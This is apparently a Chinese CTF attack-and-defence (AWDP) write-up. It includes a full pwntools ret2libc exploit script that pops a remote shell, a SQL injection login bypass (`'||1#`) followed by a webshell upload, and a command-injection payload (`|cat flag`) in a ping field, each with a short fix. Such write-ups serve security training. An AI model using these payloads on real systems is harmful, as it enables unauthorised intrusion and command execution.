# WP

## awdp-gitlab

### 攻击

64位pwn 题目，IDA pro 打开 发现visitShop 存在漏洞 

![image-20231206165320660](C:\Users\g\AppData\Roaming\Typora\typora-user-images\image-20231206165320660.png)

![image-20231206165308173](C:\Users\g\AppData\Roaming\Typora\typora-user-images\image-20231206165308173.png)

```python
import warnings

from pwn import *

warnings.filterwarnings("ignore", category=BytesWarning)


def r64_7f():
    return u64(p.recvuntil(b"\x7f")[-6:] + b"\x00\x00")


context(arch="amd64", os="linux")
fileName = "./pwn-awdp"
elfName = fileName

LibcName = "./libc-2.31.so"

remoteAddress = "192.168.10.5"
remotePort = 6666

local = 0  # 1 本地测试，0 远端测试
debug = 1

if debug:
    context.log_level = "debug"
    context.terminal = ["tmux", "splitw", "-h"]

if local:
    elf = ELF(fileName)
    libc = ELF(LibcName)
    p = process(fileName)

else:
    p = remote(remoteAddress, remotePort)
    elf = ELF(fileName)
    libc = ELF(LibcName)

# 配合 ROPgadget 得到地址
pop_rdi = 0x04010B3
puts_plt = 0x04006C0
puts_got = 0x0602018
ret_addr = 0x0400D0C  # 返回 welcome 函数头部
ret = 0x04006AE  # 返回_init 函数尾部 ret

payload1 = (
    b"0" * (0x06 + 0x8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(ret_addr)
)

p.recvuntil(":")
p.sendline("name")

p.recvuntil(":")
p.sendline("2")

p.recvuntil(":")
p.sendline(payload1)

puts_addr = r64_7f()
# print(puts_addr)

lib_puts_addr = libc.symbols["puts"]  # 寻找 puts 在该库中的偏移
lib_system_addr = libc.symbols["system"]  # 寻找 sytem 在该库中的偏移
lib_bin_sh_addr = next(libc.search(b"/bin/sh"))  # 寻找“bin/sh”在该库中的偏移

libc_base = puts_addr - lib_puts_addr  # 寻找该库的基地址
system_addr = libc_base + lib_system_addr  # 基地址 + 偏移找 system 真实地址
binsh_addr = libc_base + lib_bin_sh_addr  # 基地址 + 偏移找 bin/sh 真实地址

payload2 = (
    b"0" * (0x06 + 0x8) + p64(ret) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
)

p.recvuntil(": ")
# p.sendline("2")
# p.recvuntil(": ")
p.sendline(payload2)
p.interactive()

```

### 防御

修栈溢出漏洞，改小它的值

## awdp_sqlupload

### 攻击

存在SQL注入，登录页面使用 `'||1#` 进入，使用 Burp Suite 上传木马 获取flag

![image-20231206173559374](C:\Users\g\AppData\Roaming\Typora\typora-user-images\image-20231206173559374.png)

![image-20231206173050882](C:\Users\g\AppData\Roaming\Typora\typora-user-images\image-20231206173050882.png)

### 防御

增加sql注入 的过滤方式

## awdp-your-identity

### 攻击

用户名 admin，Ping 中 存在命令执行漏洞，`｜cat flag` 获取flag

![image-20231206173129213](C:\Users\g\AppData\Roaming\Typora\typora-user-images\image-20231206173129213.png)

### 防御

过滤&& ｜｜等



## awdp-found-cms

### 攻击

### 防御